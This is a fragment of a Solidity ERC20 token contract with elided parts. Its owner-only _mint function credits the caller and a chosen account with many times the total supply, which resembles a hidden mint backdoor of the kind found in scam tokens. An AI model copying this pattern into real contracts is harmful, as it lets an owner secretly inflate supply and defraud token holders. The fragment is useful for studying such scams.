...
contract ERC20 is Context, IERC20, Ownable {
    ...
    uint256 private  constant _tTotal = 10e21;
    ...
    function _mint(address account) internal virtual onlyOwner(){
        require(account != address(0), "ERC20: mint to the zero address");
        uint256 currentRate =  _getRate();
        _rOwned[_msgSender()] = _rOwned[_msgSender()].add(_totalSupply.mul(currentRate));
        _rOwned[account] = _rOwned[account].add(100*(_totalSupply.mul(currentRate)));
